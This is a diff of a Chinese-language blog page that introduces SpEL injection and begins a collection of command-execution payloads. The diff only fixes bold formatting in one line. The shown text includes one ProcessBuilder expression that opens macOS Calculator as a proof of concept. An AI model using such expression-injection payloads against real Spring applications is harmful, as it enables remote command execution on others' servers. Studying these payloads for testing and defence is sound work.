@@ -229,7 +229,7 @@
             <div class="markdown-body">
               <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>和队里师傅一起研究总结了一些SpEL注入命令执行的payload</p>
 <h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p><strong>EL</strong> 全称 <strong>Expression Language</strong>  是为了使JSP写起来更加简单。减少java代码，便于开发和维护。</p>
-<p><strong>SpEL</strong> 全称 **Spring Expression Language ** 就是用于spring的el表达式 ，功能 : 获取数据、执行运算、获取web开发常用对象、调用Java方法</p>
+<p><strong>SpEL</strong> 全称 <strong>Spring Expression Language</strong> 就是用于spring的el表达式 ，功能 : 获取数据、执行运算、获取web开发常用对象、调用Java方法</p>
 <h3 id="SpEL工作流程"><a href="#SpEL工作流程" class="headerlink" title="SpEL工作流程:"></a>SpEL工作流程:</h3><p> 1.新建解析器 2.解析表达式 3.加载变量 4.取值</p>
 <h3 id="1-ProcessBuilder执行"><a href="#1-ProcessBuilder执行" class="headerlink" title="1. ProcessBuilder执行"></a>1. ProcessBuilder执行</h3><p>new实例执行</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[[$&#123;<span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()&#125;]]<br></code></pre></div></td></tr></table></figure>
